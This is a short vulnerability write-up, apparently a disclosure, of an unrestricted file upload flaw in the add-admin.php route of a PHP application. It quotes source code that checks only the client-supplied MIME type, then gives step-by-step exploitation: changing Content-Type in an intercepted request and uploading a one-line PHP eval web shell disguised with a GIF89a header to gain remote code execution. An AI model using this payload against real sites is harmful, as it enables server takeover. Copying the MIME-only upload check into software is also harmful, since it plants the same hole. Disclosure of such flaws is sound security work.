User can be added under the `add-admin.php` route，and there are any pictures to upload

![image-20250401224104067](https://bu.dusays.com/2025/04/01/67ebfdd86e2d8.png)

Locate L28-L40 of add-admin.php source code

```
$file_type = $_FILES['avatar']['type']; //returns the mimetype
$allowed = array("image/jpg", "image/gif","image/jpeg", "image/webp","image/png");
if(!in_array($file_type, $allowed)) {
$_SESSION['error'] ='Only jpg,jpeg,Webp, gif, and png files are allowed. ';

// exit();

}else{
$image= addslashes(file_get_contents($_FILES['avatar']['tmp_name']));
$image_name= addslashes($_FILES['avatar']['name']);
$image_size= getimagesize($_FILES['avatar']['tmp_name']);
move_uploaded_file($_FILES["avatar"]["tmp_name"],"uploadImage/" . $_FILES["avatar"]["name"]);			
$location="uploadImage/" . $_FILES["avatar"]["name"];
```

You can see that only the MIME type of the uploaded file is detected, and the uploaded file is placed in the `uploadImage` directory. Capture the packet and change `Content-Type` to `image/jpg` to bypass it. You can fill in other information as you like. The email address must comply with the regulations, such as 1@qq.com, and upload 1.php

```
GIF89a
<?= @eval($_POST[1]);?>
```

![image-20250401195430147](https://bu.dusays.com/2025/04/01/67ebfde2e4acd.png)

Visit `uploadImage/1.php` to rce

![image-20250401195604897](https://bu.dusays.com/2025/04/01/67ebfdec36b8e.png)
